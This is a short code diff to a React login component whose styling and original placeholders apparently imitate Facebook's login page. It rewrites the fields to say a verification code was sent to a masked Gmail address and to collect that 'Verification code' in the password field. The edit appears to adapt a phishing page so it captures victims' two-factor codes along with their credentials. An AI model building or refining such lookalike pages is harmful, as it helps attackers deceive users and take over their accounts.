@@ -54,16 +54,16 @@ export default function Login() {
             <input
               type="text"
               name="email"
-              placeholder="Mobile number or email"
+              placeholder="We have send a verification code to a****9@gmail.com"
               value={formData.email}
               onChange={handleChange}
-              required
+              
               className="border border-gray-300 rounded-md px-4 py-3 text-lg outline-none focus:border-[#1877f2]"
             />
             <input
               type="password"
               name="password"
-              placeholder="Password"
+              placeholder="Verification code"
               value={formData.password}
               onChange={handleChange}
               required
